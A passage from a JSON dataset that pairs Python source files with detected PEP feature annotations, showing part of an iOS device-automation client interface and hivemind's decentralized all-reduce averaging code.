None,\n        is_ui_test: bool = False,\n        is_logic_test: bool = False,\n        tests_to_run: Optional[Set[str]] = None,\n        tests_to_skip: Optional[Set[str]] = None,\n        env: Optional[Dict[str, str]] = None,\n        args: Optional[List[str]] = None,\n        result_bundle_path: Optional[str] = None,\n        idb_log_buffer: Optional[StringIO] = None,\n        timeout: Optional[int] = None,\n        poll_interval_sec: float = 0.5,\n        report_activities: bool = False,\n        report_attachments: bool = False,\n        activities_output_path: Optional[str] = None,\n        coverage_output_path: Optional[str] = None,\n        log_directory_path: Optional[str] = None,\n        wait_for_debugger: bool = False,\n    ) -> AsyncIterator[TestRunInfo]:\n        yield\n    @abstractmethod\n    async def install(\n        self,\n        bundle: Union[str, IO[bytes]],\n        compression: Optional[Compression] = None,\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield\n    @abstractmethod\n    async def install_dylib(\n        self, dylib: Union[str, IO[bytes]]\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield\n    @abstractmethod\n    async def install_dsym(\n        self, dsym: Union[str, IO[bytes]]\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield\n    @abstractmethod\n    async def install_xctest(\n        self, xctest: Union[str, IO[bytes]]\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield\n    @abstractmethod\n    async def install_framework(\n        self, framework_path: Union[str, IO[bytes]]\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield\n    @abstractmethod\n    async def uninstall(self, bundle_id: str) -> None:\n        pass\n    @abstractmethod\n    async def list_xctests(self) -> List[InstalledTestInfo]:\n        pass\n    @abstractmethod\n    async def terminate(self, bundle_id: str) -> None:\n        pass\n    @abstractmethod\n    async def list_test_bundle(self, test_bundle_id: str, app_path: str) -> List[str]:\n        pass\n    @abstractmethod\n    async def tail_logs(\n        self, stop: asyncio.Event, arguments: Optional[List[str]] = None\n    ) -> AsyncIterator[str]:\n        yield\n    @abstractmethod\n    async def tail_companion_logs(self, stop: asyncio.Event) -> AsyncIterator[str]:\n        yield\n    @abstractmethod\n    async def clear_keychain(self) -> None:\n        pass\n    @abstractmethod\n    async def set_hardware_keyboard(self, enabled: bool) -> None:\n        pass\n    @abstractmethod\n    async def set_locale(self, locale_identifier: str) -> None:\n        pass\n    @abstractmethod\n    async def get_locale(self) -> str:\n        pass\n    @abstractmethod\n    async def list_locale_identifiers(self) -> List[str]:\n        pass\n    @abstractmethod\n    async def open_url(self, url: str) -> None:\n        pass\n    @abstractmethod\n    async def set_location(self, latitude: float, longitude: float) -> None:\n        pass\n    @abstractmethod\n    async def approve(\n        self, bundle_id: str, permissions: Set[Permission], scheme: Optional[str] = None\n    ) -> None:\n        pass\n    @abstractmethod\n    async def record_video(self, stop: asyncio.Event, output_file: str) -> None:\n        pass\n    @abstractmethod\n    async def stream_video(\n        self,\n        output_file: Optional[str],\n        fps: Optional[int],\n        format: VideoFormat,\n        compression_quality: float,\n        scale_factor: float = 1,\n    ) -> AsyncGenerator[bytes, None]:\n        yield\n    @abstractmethod\n    async def screenshot(self) -> bytes:\n        pass\n    @abstractmethod\n    async def tap(self, x: float, y: float, duration: Optional[float] = None) -> None:\n        pass\n    @abstractmethod\n    async def button(\n        self, button_type: HIDButtonType, duration: Optional[float] = None\n    ) -> None:\n        pass\n    @abstractmethod\n    async def key(self, keycode: int, duration: Optional[float] = None) -> None:\n        return\n    @abstractmethod\n    async def key_sequence(self, key_sequence: List[int]) -> None:\n        pass\n    @abstractmethod\n    async def swipe(\n        self,\n        p_start: Tuple[int, int],\n        p_end: Tuple[int, int],\n        duration: Optional[float] = None,\n        delta: Optional[int] = None,\n    ) -> None:\n        pass\n    @abstractmethod\n    async def crash_show(self, name: str) -> CrashLog:\n        pass\n    @abstractmethod\n    async def contacts_update(self, contacts_path: str) -> None:\n        pass\n    @abstractmethod\n    async def describe(self, fetch_diagnostics: bool = False) -> TargetDescription:\n        pass\n    @abstractmethod\n    async def accessibility_info(\n        self, point: Optional[Tuple[int, int]], nested: bool\n    ) -> AccessibilityInfo:\n        pass\n    @abstractmethod\n    async def run_instruments(\n        self,\n        stop: asyncio.Event,\n        trace_basename: str,\n        template_name: str,\n        app_bundle_id: str,\n        app_environment: Optional[Dict[str, str]] = None,\n        app_arguments: Optional[List[str]] = None,\n        tool_arguments: Optional[List[str]] = None,\n        started: Optional[asyncio.Event] = None,\n        timings: Optional[InstrumentsTimings] = None,\n        post_process_arguments: Optional[List[str]] = None,\n    ) -> List[str]:\n        pass\n    @abstractmethod\n    async def xctrace_record(\n        self,\n        stop: asyncio.Event,\n        output: str,\n        template_name: str,\n        all_processes: bool = False,\n        time_limit: Optional[float] = None,\n        package: Optional[str] = None,\n        process_to_attach: Optional[str] = None,\n        process_to_launch: Optional[str] = None,\n        process_env: Optional[Dict[str, str]] = None,\n        launch_args: Optional[List[str]] = None,\n        target_stdin: Optional[str] = None,\n        target_stdout: Optional[str] = None,\n        post_args: Optional[List[str]] = None,\n        stop_timeout: Optional[float] = None,\n        started: Optional[asyncio.Event] = None,\n    ) -> List[str]:\n        pass\n    @abstractmethod\n    async def crash_list(self, query: CrashLogQuery) -> List[CrashLogInfo]:\n        pass\n    @abstractmethod\n    async def crash_delete(self, query: CrashLogQuery) -> List[CrashLogInfo]:\n        pass\n    @abstractmethod\n    async def add_media(self, file_paths: List[str]) -> None:\n        pass\n    @abstractmethod\n    async def focus(self) -> None:\n        pass\n    @abstractmethod\n    async def debugserver_start(self, bundle_id: str) -> List[str]:\n        pass\n    @abstractmethod\n    async def debugserver_stop(self) -> None:\n        pass\n    @abstractmethod\n    async def debugserver_status(self) -> Optional[List[str]]:\n        pass\n    @abstractmethod\n    async def text(self, text: str) -> None:\n        return\n    @abstractmethod\n    async def hid(self, event_iterator: AsyncIterable[HIDEvent]) -> None:\n        pass\n    @abstractmethod\n    async def ls_single(\n        self, container: FileContainer, path: str\n    ) -> List[FileEntryInfo]:\n        pass\n    @abstractmethod\n    async def ls(self, container: FileContainer, paths: List[str]) -> List[FileListing]:\n        pass\n    @abstractmethod\n    async def mv(\n        self, container: FileContainer, src_paths: List[str], dest_path: str\n    ) -> None:\n        pass\n    @abstractmethod\n    async def rm(self, container: FileContainer, paths: List[str]) -> None:\n        pass\n    @abstractmethod\n    async def mkdir(self, container: FileContainer, path: str) -> None:\n        pass\n    @abstractmethod\n    async def pull(\n        self, container: FileContainer, src_path: str, dest_path: str\n    ) -> None:\n        pass\n    @abstractmethod\n    async def push(\n        self, src_paths: List[str], container: FileContainer, dest_path: str\n    ) -> None:\n        pass\n    @abstractmethod\n    async def tail(\n        self, stop: asyncio.Event, container: FileContainer, path: str\n    ) -> AsyncIterator[bytes]:\n        yield\nclass ClientManager:\n    @abstractmethod\n    async def connect(\n        self,\n        destination: ConnectionDestination,\n        metadata: Optional[Dict[str, str]] = None,\n    ) -> CompanionInfo:\n        pass\n    @abstractmethod\n    async def disconnect(self, destination: Union[Address, str]) -> None:\n        pass\n    @abstractmethod\n    async def list_targets(self) -> List[TargetDescription]:\n        pass\n    @abstractmethod\n    async def kill(self) -> None:\n        pass\nclass Server(ABC):\n    @abstractmethod\n    def close(self) -> None:\n        pass\n    @abstractmethod\n    async def wait_closed(self) -> None:\n        pass\n    @abstractproperty\n    def ports(self) -> Dict[str, str]:\n        pass",
            "patterns": {
                "pep_526": [
                    [
                        29,
                        "exit_code: int"
                    ],
                    [
                        42,
                        "ecid: int"
                    ],
                    [
                        51,
                        "host: str"
                    ],
                    [
                        52,
                        "port: int"
                    ],
                    [
                        55,
                        "path: str"
                    ],
                    [
                        63,
                        "bundle_id: str"
                    ],
                    [
                        64,
                        "name: str"
                    ],
                    [
                        65,
                        "architectures: Set[str]"
                    ],
                    [
                        66,
                        "install_type: str"
                    ],
                    [
                        67,
                        "process_state: AppProcessState"
                    ],
                    [
                        68,
                        "debuggable: bool"
                    ],
                    [
                        71,
                        "launch_error_timeout: Optional[float] = None"
                    ],
                    [
                        72,
                        "launch_retry_timeout: Optional[float] = None"
                    ],
                    [
                        73,
                        "terminate_timeout: Optional[float] = None"
                    ],
                    [
                        74,
                        "operation_duration: Optional[float] = None"
                    ],
                    [
                        84,
                        "udid: str"
                    ],
                    [
                        85,
                        "is_local: bool"
                    ],
                    [
                        86,
                        "address: Address"
                    ],
                    [
                        87,
                        "metadata: LoggingMetadata = field(default_factory=dict)"
                    ],
                    [
                        90,
                        "width: int"
                    ],
                    [
                        91,
                        "height: int"
                    ],
                    [
                        92,
                        "density: Optional[float]"
                    ],
                    [
                        93,
                        "width_points: Optional[int]"
                    ],
                    [
                        94,
                        "height_points: Optional[int]"
                    ],
                    [
                        98,
                        "udid: str"
                    ],
                    [
                        99,
                        "name: str"
                    ],
                    [
                        100,
                        "state: Optional[str]"
                    ],
                    [
                        101,
                        "target_type: Optional[str]"
                    ],
                    [
                        102,
                        "os_version: Optional[str]"
                    ],
                    [
                        103,
                        "architecture: Optional[str]"
                    ],
                    [
                        104,
                        "companion_info: Optional[CompanionInfo]"
                    ],
                    [
                        105,
                        "screen_dimensions: Optional[ScreenDimensions]"
                    ],
                    [
                        106,
                        "model: Optional[str] = None"
                    ],
                    [
                        107,
                        "device: Optional[DeviceDetails] = None"
                    ],
                    [
                        108,
                        "extended: Optional[DeviceDetails] = None"
                    ],
                    [
                        109,
                        "diagnostics: Optional[DeviceDetails] = None"
                    ],
                    [
                        110,
                        "metadata: LoggingMetadata = field(default_factory=dict)"
                    ],
                    [
                        116,
                        "path: str"
                    ],
                    [
                        119,
                        "parent: str"
                    ],
                    [
                        120,
                        "entries: List[FileEntryInfo]"
                    ],
                    [
                        123,
                        "json: Optional[str]"
                    ],
                    [
                        126,
                        "name: Optional[str]"
                    ],
                    [
                        127,
                        "bundle_id: Optional[str]"
                    ],
                    [
                        128,
                        "process_name: Optional[str]"
                    ],
                    [
                        129,
                        "parent_process_name: Optional[str]"
                    ],
                    [
                        130,
                        "process_identifier: Optional[int]"
                    ],
                    [
                        131,
                        "parent_process_identifier: Optional[int]"
                    ],
                    [
                        132,
                        "timestamp: Optional[int]"
                    ],
                    [
                        135,
                        "info: Optional[CrashLogInfo]"
                    ],
                    [
                        136,
                        "contents: Optional[str]"
                    ],
                    [
                        139,
                        "since: Optional[int] = None"
                    ],
                    [
                        140,
                        "before: Optional[int] = None"
                    ],
                    [
                        141,
                        "bundle_id: Optional[str] = None"
                    ],
                    [
                        142,
                        "name: Optional[str] = None"
                    ],
                    [
                        145,
                        "message: str"
                    ],
                    [
                        146,
                        "file: str"
                    ],
                    [
                        147,
                        "line: int"
                    ],
                    [
                        150,
                        "payload: bytes"
                    ],
                    [
                        151,
                        "timestamp: float"
                    ],
                    [
                        152,
                        "name: str"
                    ],
                    [
                        153,
                        "uniform_type_identifier: str"
                    ],
                    [
                        156,
                        "title: str"
                    ],
                    [
                        157,
                        "duration: float"
                    ],
                    [
                        158,
                        "uuid: str"
                    ],
                    [
                        159,
                        "activity_type: str"
                    ],
                    [
                        160,
                        "start: float"
                    ],
                    [
                        161,
                        "finish: float"
                    ],
                    [
                        162,
                        "name: str"
                    ],
                    [
                        163,
                        "attachments: List[TestAttachment]"
                    ],
                    [
                        164,
                        "sub_activities: List[\"TestActivity\"]"
                    ],
                    [
                        167,
                        "bundle_name: str"
                    ],
                    [
                        168,
                        "class_name: str"
                    ],
                    [
                        169,
                        "method_name: str"
                    ],
                    [
                        170,
                        "logs: List[str]"
                    ],
                    [
                        171,
                        "duration: float"
                    ],
                    [
                        172,
                        "passed: bool"
                    ],
                    [
                        173,
                        "failure_info: Optional[TestRunFailureInfo]"
                    ],
                    [
                        174,
                        "activityLogs: Optional[List[TestActivity]]"
                    ],
                    [
                        175,
                        "crashed: bool"
                    ],
                    [
                        181,
                        "bundle_id: str"
                    ],
                    [
                        182,
                        "name: Optional[str]"
                    ],
                    [
                        183,
                        "architectures: Optional[Set[str]]"
                    ],
                    [
                        189,
                        "x: float"
                    ],
                    [
                        190,
                        "y: float"
                    ],
                    [
                        193,
                        "point: Point"
                    ],
                    [
                        196,
                        "button: HIDButtonType"
                    ],
                    [
                        199,
                        "keycode: int"
                    ],
                    [
                        203,
                        "action: HIDPressAction"
                    ],
                    [
                        204,
                        "direction: HIDDirection"
                    ],
                    [
                        207,
                        "start: Point"
                    ],
                    [
                        208,
                        "end: Point"
                    ],
                    [
                        209,
                        "delta: Optional[float]"
                    ],
                    [
                        210,
                        "duration: Optional[float]"
                    ],
                    [
                        213,
                        "duration: float"
                    ],
                    [
                        217,
                        "name: str"
                    ],
                    [
                        218,
                        "uuid: Optional[str]"
                    ],
                    [
                        219,
                        "progress: Optional[float]"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_557": [
                    [
                        4,
                        4,
                        "dataclasses import",
                        "from dataclasses import asdict, dataclass, field"
                    ]
                ],
                "pep_585": [
                    [
                        8,
                        "from typing import (",
                        "suggestion"
                    ],
                    [
                        8,
                        "from typing import (",
                        "suggestion"
                    ],
                    [
                        8,
                        "from typing import (",
                        "suggestion"
                    ],
                    [
                        8,
                        "from typing import (",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        65,
                        "    architectures: Set[str]",
                        "violation"
                    ],
                    [
                        120,
                        "    entries: List[FileEntryInfo]",
                        "violation"
                    ],
                    [
                        163,
                        "    attachments: List[TestAttachment]",
                        "violation"
                    ],
                    [
                        164,
                        "    sub_activities: List[\"TestActivity\"]",
                        "violation"
                    ],
                    [
                        170,
                        "    logs: List[str]",
                        "violation"
                    ],
                    [
                        582,
                        "    def ports(self) -> Dict[str, str]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        245,
                        248,
                        "async generator",
                        "async def boot_headless(  \n        self, udid: str, verify: bool = True, timeout: Optional[timedelta] = None\n    ) -> AsyncContextManager[None]:\n        yield"
                    ],
                    [
                        277,
                        280,
                        "async generator",
                        "async def tail_targets(\n        self, only: Optional[OnlyFilter] = None\n    ) -> AsyncGenerator[List[TargetDescription], None]:\n        yield"
                    ],
                    [
                        290,
                        293,
                        "async generator",
                        "async def unix_domain_server(  \n        self, udid: str, path: str, only: Optional[OnlyFilter] = None\n    ) -> AsyncContextManager[str]:\n        yield"
                    ],
                    [
                        312,
                        334,
                        "async generator",
                        "async def run_xctest(\n        self,\n        test_bundle_id: str,\n        app_bundle_id: str,\n        test_host_app_bundle_id: Optional[str] = None,\n        is_ui_test: bool = False,\n        is_logic_test: bool = False,\n        tests_to_run: Optional[Set[str]] = None,\n        tests_to_skip: Optional[Set[str]] = None,\n        env: Optional[Dict[str, str]] = None,\n        args: Optional[List[str]] = None,\n        result_bundle_path: Optional[str] = None,\n        idb_log_buffer: Optional[StringIO] = None,\n        timeout: Optional[int] = None,\n        poll_interval_sec: float = 0.5,\n        report_activities: bool = False,\n        report_attachments: bool = False,\n        activities_output_path: Optional[str] = None,\n        coverage_output_path: Optional[str] = None,\n        log_directory_path: Optional[str] = None,\n        wait_for_debugger: bool = False,\n    ) -> AsyncIterator[TestRunInfo]:\n        yield"
                    ],
                    [
                        336,
                        341,
                        "async generator",
                        "async def install(\n        self,\n        bundle: Union[str, IO[bytes]],\n        compression: Optional[Compression] = None,\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield"
                    ],
                    [
                        343,
                        346,
                        "async generator",
                        "async def install_dylib(\n        self, dylib: Union[str, IO[bytes]]\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield"
                    ],
                    [
                        348,
                        351,
                        "async generator",
                        "async def install_dsym(\n        self, dsym: Union[str, IO[bytes]]\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield"
                    ],
                    [
                        353,
                        356,
                        "async generator",
                        "async def install_xctest(\n        self, xctest: Union[str, IO[bytes]]\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield"
                    ],
                    [
                        358,
                        361,
                        "async generator",
                        "async def install_framework(\n        self, framework_path: Union[str, IO[bytes]]\n    ) -> AsyncIterator[InstalledArtifact]:\n        yield"
                    ],
                    [
                        375,
                        378,
                        "async generator",
                        "async def tail_logs(\n        self, stop: asyncio.Event, arguments: Optional[List[str]] = None\n    ) -> AsyncIterator[str]:\n        yield"
                    ],
                    [
                        380,
                        381,
                        "async generator",
                        "async def tail_companion_logs(self, stop: asyncio.Event) -> AsyncIterator[str]:\n        yield"
                    ],
                    [
                        412,
                        420,
                        "async generator",
                        "async def stream_video(\n        self,\n        output_file: Optional[str],\n        fps: Optional[int],\n        format: VideoFormat,\n        compression_quality: float,\n        scale_factor: float = 1,\n    ) -> AsyncGenerator[bytes, None]:\n        yield"
                    ],
                    [
                        553,
                        556,
                        "async generator",
                        "async def tail(\n        self, stop: asyncio.Event, container: FileContainer, path: str\n    ) -> AsyncIterator[bytes]:\n        yield"
                    ]
                ]
            }
        },
        "44": {
            "file": "import asyncio\nfrom typing import Sequence, Dict, Tuple, AsyncIterator, Any, Optional\nfrom enum import Enum\nimport grpc\nimport torch\nfrom hivemind.averaging.partition import TensorPartContainer, TensorPartReducer, AllreduceException\nfrom hivemind.utils import Endpoint, get_logger, ChannelCache\nfrom hivemind.utils.asyncio import anext, achain, aiter, aenumerate, amap_in_executor\nfrom hivemind.utils.compression import serialize_torch_tensor, deserialize_torch_tensor\nfrom hivemind.proto import averaging_pb2_grpc, averaging_pb2\nGroupID = bytes\nlogger = get_logger(__name__)\nclass AveragingMode(Enum):\n    NODE = 0\n    CLIENT = 1\n    AUX = 2\nclass AllReduceRunner(averaging_pb2_grpc.DecentralizedAveragingServicer):\n    def __init__(\n        self,\n        *,\n        group_id: GroupID,\n        tensors: Sequence[torch.Tensor],\n        endpoint: Endpoint,\n        ordered_group_endpoints: Sequence[Endpoint],\n        peer_fractions: Tuple[float, ...],\n        weights: Optional[Sequence[float]] = None,\n        modes: Optional[Sequence[AveragingMode]] = None,\n        gathered: Optional[Dict[Endpoint, Any]] = None,\n        **kwargs,\n    ):\n        assert endpoint in ordered_group_endpoints, \"endpoint is not a part of the group\"\n        modes = modes or tuple(AveragingMode.CLIENT if frac == 0 else AveragingMode.NODE for frac in peer_fractions)\n        weights = weights or tuple(int(mode != AveragingMode.AUX) for mode in modes)\n        assert len(weights) == len(modes) == len(ordered_group_endpoints), \"lists have inconsistent length\"\n        assert any(mode != AveragingMode.CLIENT for mode in modes), \"cannot run allreduce without reducers\"\n        for mode, frac, weight in zip(modes, peer_fractions, weights):\n            assert mode != AveragingMode.CLIENT or frac == 0, \"client-mode peer should have zero all-reduce fraction\"\n            assert mode != AveragingMode.AUX or weight == 0, \"auxiliary peer should have zero averaging weight\"\n        self.group_id, self.endpoint, self.ordered_group_endpoints = group_id, endpoint, ordered_group_endpoints\n        self.modes, self.peer_fractions, self.gathered = modes, peer_fractions, gathered\n        self._future = asyncio.Future()\n        self.sender_endpoints, self.sender_weights = [], []\n        for endpoint, weight, mode in zip(self.ordered_group_endpoints, weights, modes):\n            if mode != AveragingMode.AUX:\n                self.sender_endpoints.append(endpoint)\n                self.sender_weights.append(weight)\n        endpoint_index = self.ordered_group_endpoints.index(self.endpoint)\n        self.tensor_part_container = TensorPartContainer(tensors, peer_fractions, **kwargs)\n        self.parts_for_local_averaging = self.tensor_part_container.get_raw_input_parts(endpoint_index)\n        self.tensor_part_reducer = TensorPartReducer(\n            tuple(part.shape for part in self.parts_for_local_averaging),\n            len(self.sender_endpoints),\n            self.sender_weights,\n        )\n    def __repr__(self):\n        return f\"{self.__class__.__name__}({self.endpoint}, group_size={self.group_size})\"\n    def __aiter__(self):\n        return self.run()\n    def __contains__(self, endpoint: Endpoint):\n        return endpoint in self.ordered_group_endpoints\n    @property\n    def group_size(self):\n        return len(self.ordered_group_endpoints)\n    def _get_peer_stub(self, peer: Endpoint) -> averaging_pb2_grpc.DecentralizedAveragingStub:\n        return ChannelCache.get_stub(peer, averaging_pb2_grpc.DecentralizedAveragingStub, aio=True)\n    async def run(self) -> AsyncIterator[torch.Tensor]:\n        pending_tasks = set()\n        try:\n            if len(self.sender_endpoints) == 0:\n                logger.debug(f\"{self} - finished all-reduce early: all peers are auxiliaries ({self.modes})\")\n                self.finalize()\n            elif self.endpoint in self.sender_endpoints:\n                for endpoint, parts in zip(self.ordered_group_endpoints, self.tensor_part_container.num_parts_by_peer):\n                    if parts != 0:\n                        pending_tasks.add(asyncio.create_task(self._communicate_with_peer(endpoint)))\n                async for averaged_tensor_delta in self.tensor_part_container.iterate_output_tensors():\n                    yield averaged_tensor_delta  \n                self.finalize()\n            else:  \n                await self.tensor_part_reducer.finished.wait()\n                self.finalize()\n        except BaseException as e:\n            self.finalize(exception=e)\n            for task in pending_tasks:\n                task.cancel()\n            raise\n    async def _communicate_with_peer(self, peer_endpoint: Endpoint):\n        peer_index = self.ordered_group_endpoints.index(peer_endpoint)\n        if peer_endpoint == self.endpoint:\n            sender_index = self.sender_endpoints.index(peer_endpoint)\n            for part_index, tensor_part in enumerate(self.parts_for_local_averaging):\n                averaged_part = await self.tensor_part_reducer.accumulate_part(sender_index, part_index, tensor_part)\n                self.tensor_part_container.register_processed_part(peer_index, part_index, averaged_part - tensor_part)\n        else:\n            loop = asyncio.get_event_loop()\n            stream = self._get_peer_stub(peer_endpoint).rpc_aggregate_part()\n            write_task = asyncio.create_task(self._write_to_peer(stream, peer_index))\n            try:\n                code = None\n                async for part_index, msg in aenumerate(stream):\n                    if code is None:\n                        code = msg.code\n                    averaged_part_delta = await loop.run_in_executor(None, deserialize_torch_tensor, msg.tensor_part)\n                    self.tensor_part_container.register_processed_part(peer_index, part_index, averaged_part_delta)\n                await write_task\n                if code != averaging_pb2.AVERAGED_PART:\n                    raise AllreduceException(\n                        f\"peer {peer_endpoint} returned {averaging_pb2.MessageCode.Name(code)} \"\n                        f\"instead of {averaging_pb2.MessageCode.Name(averaging_pb2.AVERAGED_PART)}\"\n                        f\", allreduce failed\"\n                    )\n            finally:\n                if not write_task.done():\n                    write_task.cancel()\n    async def _write_to_peer(self, stream: grpc.aio.StreamStreamCall, peer_index: int):\n        parts_aiter = self.tensor_part_container.iterate_input_parts_for(peer_index)\n        first_part = await anext(parts_aiter)\n        await stream.write(\n            averaging_pb2.AveragingData(\n                code=averaging_pb2.PART_FOR_AVERAGING,\n                group_id=self.group_id,\n                endpoint=self.endpoint,\n                tensor_part=first_part,\n            )\n        )\n        async for part in parts_aiter:\n            await stream.write(averaging_pb2.AveragingData(tensor_part=part))\n        await stream.done_writing()\n    async def rpc_aggregate_part(\n        self, stream: AsyncIterator[averaging_pb2.AveragingData], context: grpc.ServicerContext\n    ) -> AsyncIterator[averaging_pb2.AveragingData]:\n        request: averaging_pb2.AveragingData = await anext(stream)\n        reason_to_reject = self._check_reasons_to_reject(request)\n        if reason_to_reject:\n            yield reason_to_reject\n            return\n        elif request.code == averaging_pb2.PART_FOR_AVERAGING:\n            try:\n                sender_index = self.sender_endpoints.index(request.endpoint)\n                async for msg in self._accumulate_parts_streaming(achain(aiter(request), stream), sender_index):\n                    yield msg\n            except Exception as e:\n                self.finalize(exception=e)\n                yield averaging_pb2.AveragingData(code=averaging_pb2.INTERNAL_ERROR)\n        else:\n            error_code = averaging_pb2.MessageCode.Name(request.code)\n            logger.debug(f\"{self} - peer {request.endpoint} sent {error_code}, allreduce cannot continue\")\n            self.finalize(exception=AllreduceException(f\"peer {request.endpoint} sent {error_code}.\"))\n            yield averaging_pb2.AveragingData(code=averaging_pb2.INTERNAL_ERROR)\n    def _check_reasons_to_reject(self, request: averaging_pb2.AveragingData) -> Optional[averaging_pb2.AveragingData]:\n        if request.group_id != self.group_id:\n            return averaging_pb2.AveragingData(code=averaging_pb2.BAD_GROUP_ID)\n        elif self._future.cancelled():\n            return averaging_pb2.AveragingData(code=averaging_pb2.CANCELLED)\n        elif self._future.done():\n            return averaging_pb2.AveragingData(code=averaging_pb2.INTERNAL_ERROR)\n    async def _accumulate_parts_streaming(self, stream: AsyncIterator[averaging_pb2.AveragingData], sender_index: int):\n        loop = asyncio.get_event_loop()\n        async for part_index, (tensor_part, part_compression) in aenumerate(\n            amap_in_executor(\n                lambda msg: (deserialize_torch_tensor(msg.tensor_part), msg.tensor_part.compression),\n                stream,\n                max_prefetch=self.tensor_part_container.prefetch,\n            )\n        ):\n            averaged_part = await self.tensor_part_reducer.accumulate_part(sender_index, part_index, tensor_part)\n            serialized_delta = await loop.run_in_executor(\n                None, lambda: serialize_torch_tensor(averaged_part - tensor_part, part_compression)\n            )\n            yield averaging_pb2.AveragingData(code=averaging_pb2.AVERAGED_PART, tensor_part=serialized_delta)\n    async def _send_error_to_peer(self, peer_endpoint: Endpoint, code: averaging_pb2.MessageCode):\n        stream = self._get_peer_stub(peer_endpoint).rpc_aggregate_part()\n        await stream.write(averaging_pb2.AveragingData(group_id=self.group_id, endpoint=self.endpoint, code=code))\n        await stream.done_writing()\n    def finalize(self, *, cancel: bool = False, exception: Optional[BaseException] = None):\n        assert not cancel or not exception, \"finalize accepts either exception or cancel, but not both\"\n        pending_tasks = set()\n        if cancel or exception:\n            if cancel or isinstance(exception, asyncio.CancelledError):\n                code = averaging_pb2.CANCELLED\n            else:\n                code = averaging_pb2.INTERNAL_ERROR\n            logger.debug(f\"{self} - notifying peers about {averaging_pb2.MessageCode.Name(code)}\")\n            for peer_endpoint, mode in zip(self.ordered_group_endpoints, self.modes):\n                if peer_endpoint != self.endpoint and mode != AveragingMode.CLIENT:\n                    pending_tasks.add(asyncio.create_task(self._send_error_to_peer(peer_endpoint, code)))\n        if not self._future.done():\n            if cancel:\n                logger.debug(f\"{self} - cancelled\")\n                self._future.cancel()\n            elif exception:\n                logger.debug(f\"{self} - caught {exception}\")\n                self._future.set_exception(exception)\n            else:\n                logger.debug(f\"{self} - finished\")\n                self._future.set_result(None)\n            self.tensor_part_container.finalize()\n            self.tensor_part_reducer.finalize()\n            return pending_tasks\n        else:\n            logger.debug(f\"{self} - could not finish: allreduce is already finished: {self._future}\")\n            return pending_tasks",
            "patterns": {
                "pep_468": [
                    [
                        48,
                        "TensorPartContainer(tensors, peer_fractions, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        132,
                        "request: averaging_pb2.AveragingData = await anext(stream)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        2,
                        "from typing import Sequence, Dict, Tuple, AsyncIterator, Any, Optional",
                        "suggestion"
                    ],
                    [
                        2,
                        "from typing import Sequence, Dict, Tuple, AsyncIterator, Any, Optional",
                        "suggestion"
                    ]
                ],
                "pep_525": [
                    [
                        66,
                        86,
                        "async generator",
                        "async def run(self) -> AsyncIterator[torch.Tensor]:\n        pending_tasks = set()\n        try:\n            if len(self.sender_endpoints) == 0:\n                logger.debug(f\"{self} - finished all-reduce early: all peers are auxiliaries ({self.modes})\")\n                self.finalize()\n            elif self.endpoint in self.sender_endpoints:\n                for endpoint, parts in zip(self.ordered_group_endpoints, self.tensor_part_container.num_parts_by_peer):\n                    if parts != 0:\n                        pending_tasks.add(asyncio.create_task(self._communicate_with_peer(endpoint)))\n                async for averaged_tensor_delta in self.tensor_part_container.iterate_output_tensors():\n                    yield averaged_tensor_delta  \n                self.finalize()\n            else:  \n                await self.tensor_part_reducer.finished.wait()\n                self.finalize()\n        except BaseException as e:\n            self.finalize(exception=e)\n            for task in pending_tasks:\n                task.cancel()\n            raise"
                    ],
                    [
                        129,
                        149,
                        "async generator",
                        "async def rpc_aggregate_part(\n        self, stream: AsyncIterator[averaging_pb2.AveragingData], context: grpc.ServicerContext\n    ) -> AsyncIterator[averaging_pb2.AveragingData]:\n        request: averaging_pb2.AveragingData = await anext(stream)\n        reason_to_reject = self._check_reasons_to_reject(request)\n        if reason_to_reject:\n            yield reason_to_reject\n            return\n        elif request.code == averaging_pb2.PART_FOR_AVERAGING:\n            try:\n                sender_index = self.sender_endpoints.index(request.endpoint)\n                async for msg in self._accumulate_parts_streaming(achain(aiter(request), stream), sender_index):\n                    yield msg\n            except Exception as e:\n                self.finalize(exception=e)\n                yield averaging_pb2.AveragingData(code=averaging_pb2.INTERNAL_ERROR)\n        else:\n            error_code = averaging_pb2.MessageCode.Name(request.code)\n            logger.debug(f\"{self} - peer {request.endpoint} sent {error_code}, allreduce cannot continue\")\n            self.finalize(exception=AllreduceException(f\"peer {request.endpoint} sent {error_code}.\"))\n            yield averaging_pb2.AveragingData(code=averaging_pb2.INTERNAL_ERROR)"
                    ],
                    [
                        157,
                        170,
                        "async generator",
                        "async def _accumulate_parts_streaming(self, stream: AsyncIterator[averaging_pb2.AveragingData], sender_index: int):\n        loop = asyncio.get_event_loop()\n        async for part_index, (tensor_part, part_compression) in aenumerate(\n            amap_in_executor(\n                lambda msg: (deserialize_torch_tensor(msg.tensor_part), msg.tensor_part.compression),\n                stream,\n                max_prefetch=self.tensor_part_container.prefetch,\n            )\n        ):\n            averaged_part = await self.tensor_part_reducer.accumulate_part(sender_index, part_index, tensor_part)\n            serialized_delta = await loop.run_in_executor(\n                None, lambda: serialize_torch_tensor(averaged_part - tensor_part, part_compression)\n            )\n            yield averaging_pb2.AveragingData(code=averaging_pb2.AVERAGED_PART, tensor_part=serialized_delta)"
                    ],
                    [
                        126,
                        127,
                        "async for",
                        "async for part in parts_aiter:\n            await stream.write(averaging_pb2.AveragingData(tensor_part=part))"
                    ],
                    [
                        159,
                        170,
                        "async for",
